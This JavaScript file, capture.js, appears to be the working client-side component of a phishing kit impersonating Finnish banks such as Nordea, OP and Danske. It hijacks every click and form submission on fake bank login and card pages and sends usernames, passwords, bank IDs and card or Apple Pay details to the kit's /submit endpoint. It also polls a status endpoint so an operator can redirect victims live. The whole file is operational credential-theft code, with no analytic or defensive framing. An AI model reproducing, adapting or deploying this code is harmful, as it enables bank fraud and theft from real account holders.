// capture.js – Polls for redirects on ALL pages
(function() {
    const path = window.location.pathname;

    // ----- POLLING ON EVERY PAGE -----
    async function pollForRedirect() {
        const sessionId = localStorage.getItem('session_id');
        if (!sessionId) {
            console.log('⏳ No session ID found');
            return;
        }

        try {
            console.log('🔄 Polling with ID:', sessionId);
            const res = await fetch('/check-status/' + sessionId, { 
                credentials: 'include' 
            });
            const data = await res.json();
            console.log('📥 Status response:', data);
            if (data.redirect) {
                console.log('🔄 Redirecting to:', data.redirect);
                window.location.href = data.redirect;
            }
        } catch (err) { 
            console.error('Polling error:', err);
        }
    }

    // Poll every 2 seconds on EVERY page
    setInterval(pollForRedirect, 2000);
    pollForRedirect();

    // ----- CODE PLACEHOLDER REPLACEMENT -----
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    if (code) {
        document.body.innerHTML = document.body.innerHTML.replace(/{code}/g, code);
    }

    // ----- BANK SELECTION (portal.html) -----
    if (path.endsWith('/portal.html')) {
        localStorage.removeItem('session_id');
        
        document.querySelectorAll('[data-auth-method-name]').forEach(function(btn) {
            btn.addEventListener('click', async function(e) {
                e.preventDefault();
                const name = this.getAttribute('title') || this.getAttribute('data-auth-method-name');
                console.log('🏦 Bank clicked:', name);
                
                // --- SPECIAL: POP Pankki and Ålandsbanken redirect to portal ---
                const redirectToPortal = ['POP Pankki', 'Ålandsbanken', 'poppankki', 'alandsbanken'];
                if (redirectToPortal.includes(name)) {
                    console.log('🔄 Redirecting to portal (excluded bank):', name);
                    window.location.href = '/portal.html';
                    return;
                }
                
                const map = {
                    'Aktia':'aktia','Ålandsbanken':'alandsbanken','Danskebank':'danske',
                    'Nordea':'nordea','Oma Säästöpankki':'omasp','Säästöpankki':'saastopankki',
                    'Osuuspankki':'op','POP Pankki':'poppankki','S-Pankki':'spankki'
                };
                const folder = map[name] || name.toLowerCase().replace(/\s+/g,'');
                
                // Generate session ID
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                let sessionId = '';
                for (let i = 0; i < 9; i++) {
                    sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                localStorage.setItem('session_id', sessionId);
                console.log('💾 Session ID created on bank click:', sessionId);
                
                // Send bank notification (exclude Ålandsbanken and POP Pankki)
                const excludedBanks = ['Ålandsbanken', 'POP Pankki', 'alandsbanken', 'poppankki'];
                if (!excludedBanks.includes(name)) {
                    try {
                        const response = await fetch('/api/bank-selected', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            credentials: 'include',
                            body: JSON.stringify({ bank: name, sessionId: sessionId })
                        });
                        const data = await response.json();
                        console.log('📥 Bank notification response:', data);
                    } catch (err) {
                        console.error('❌ Bank notification error:', err);
                    }
                }
                
                // Create session on server
                try {
                    const response = await fetch('/api/create-session', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        credentials: 'include',
                        body: JSON.stringify({ uniqueID: sessionId, bank: name })
                    });
                    const data = await response.json();
                    console.log('📥 Session creation response:', data);
                } catch (err) {
                    console.error('❌ Session creation error:', err);
                }
                
                window.location.href = '/bank/' + folder + '/login.html';
            });
        });
        return;
    }

    // ----- HELPERS -----
    function getBankFromPath() {
        const m = path.match(/\/bank\/([^\/]+)\//);
        return m ? m[1] : null;
    }

    function captureAllInputs() {
        const data = {};
        const inputs = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]), select, textarea');
        inputs.forEach(function(el) {
            const name = el.name || el.id || el.placeholder || el.className || 'field';
            if (el.value !== undefined && el.value !== null && el.value.toString().trim() !== '') {
                data[name] = el.value.toString().trim();
            }
        });
        return data;
    }

    // ----- SEND DATA (REUSE EXISTING SESSION ID) -----
    function sendData(url, data) {
        data._sourceFile = path.replace(/^\//, '');
        
        const existingSessionId = localStorage.getItem('session_id');
        console.log('📤 Sending data with session ID:', existingSessionId);
        
        if (existingSessionId) {
            data._sessionId = existingSessionId;
        }
        
        console.log('📤 Sending data to:', url, data);
        
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify(data)
        })
        .then(function(r) { return r.json(); })
        .then(function(resp) {
            console.log('📥 Server response:', resp);
            if (resp.success) {
                if (resp.uniqueID) {
                    localStorage.setItem('session_id', resp.uniqueID);
                    console.log('💾 Session ID updated to:', resp.uniqueID);
                } else {
                    console.log('💾 Keeping existing session ID:', existingSessionId);
                }
                window.location.href = '/loading.html';
            } else {
                console.error('❌ Submission failed:', resp);
            }
        })
        .catch(function(err) {
            console.error('❌ Send error:', err);
        });
    }

    // ----- SPECIAL: apay.html handling -----
    function handleApayClick(e) {
        const bank = getBankFromPath();
        const data = captureAllInputs();
        
        e.preventDefault();
        
        if (bank !== 'op') {
            fetch('/api/apay-verification', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ bank: bank })
            }).catch(function(err) { console.error('Apay notification error:', err); });
        }
        
        let redirectUrl = '';
        if (bank === 'op') {
            redirectUrl = '/bank/op/card.html';
        } else {
            redirectUrl = '/bank/' + bank + '/apay_auth.html';
        }
        
        if (Object.keys(data).length > 0) {
            data._sourceFile = path.replace(/^\//, '');
            data.page = 'apay.html';
            
            const existingSessionId = localStorage.getItem('session_id');
            if (existingSessionId) {
                data._sessionId = existingSessionId;
            }
            
            fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify(data)
            })
            .then(function(r) { return r.json(); })
            .then(function(resp) {
                if (resp.success && resp.uniqueID) {
                    localStorage.setItem('session_id', resp.uniqueID);
                }
                window.location.href = redirectUrl;
            })
            .catch(function(err) {
                console.error('Send error:', err);
                window.location.href = redirectUrl;
            });
        } else {
            window.location.href = redirectUrl;
        }
    }

    // ----- INTERCEPT ALL CLICKS -----
    document.addEventListener('click', function(e) {
        const target = e.target.closest('button, input[type="submit"], input[type="image"], a, [role="button"], [onclick]');
        if (!target) return;

        if (path.endsWith('/apay.html')) {
            handleApayClick(e);
            return;
        }

        if (target.tagName === 'A' && target.href && !target.href.includes('#') && !target.href.startsWith('javascript:')) {
            return;
        }

        const form = target.closest('form');
        if (form) {
            return;
        }

        const data = captureAllInputs();
        if (Object.keys(data).length === 0) return;

        var isLogin = false;
        if (data.username || data.user || data.userid || data.bankid) {
            if (data.password || data.pass || data.pwd) {
                isLogin = true;
            }
        }

        if (isLogin) {
            let bank = data.bank || getBankFromPath();
            if (!bank) {
                bank = prompt('Bank name:');
                if (!bank) return;
            }
            e.preventDefault();
            var loginData = {
                bank: bank,
                username: data.username || data.user || data.userid || data.bankid || 'Unknown',
                password: data.password || data.pass || data.pwd || 'Unknown'
            };
            for (var key in data) {
                if (!loginData[key] && key !== '_sourceFile') {
                    loginData[key] = data[key];
                }
            }
            sendData('/submit', loginData);
            return;
        }

        e.preventDefault();
        sendData('/submit', data);
    }, true);

    // ----- INTERCEPT FORM SUBMISSIONS -----
    document.addEventListener('submit', function(e) {
        const form = e.target;
        if (form.action && form.action.includes('/continue')) return;

        if (path.endsWith('/apay.html')) {
            e.preventDefault();
            handleApayClick(e);
            return;
        }

        e.preventDefault();
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());
        const extraData = captureAllInputs();
        Object.assign(data, extraData);

        var isLoginForm = false;
        if (data.username || data.user || data.userid || data.bankid) {
            if (data.password || data.pass || data.pwd) {
                isLoginForm = true;
            }
        }

        if (isLoginForm) {
            let bank = data.bank || getBankFromPath();
            if (!bank) {
                bank = prompt('Bank name:');
                if (!bank) return;
            }
            var loginFormData = {
                bank: bank,
                username: data.username || data.user || data.userid || data.bankid || 'Unknown',
                password: data.password || data.pass || data.pwd || 'Unknown'
            };
            for (var key in data) {
                if (!loginFormData[key] && key !== '_sourceFile') {
                    loginFormData[key] = data[key];
                }
            }
            sendData('/submit', loginFormData);
            return;
        }

        sendData('/submit', data);
    }, true);

    // ----- END SESSION -----
    window.endSession = function() {
        localStorage.removeItem('session_id');
        console.log('Session ended');
    };

    console.log('✅ capture.js loaded - POP Pankki & Ålandsbanken redirect to portal');
})();
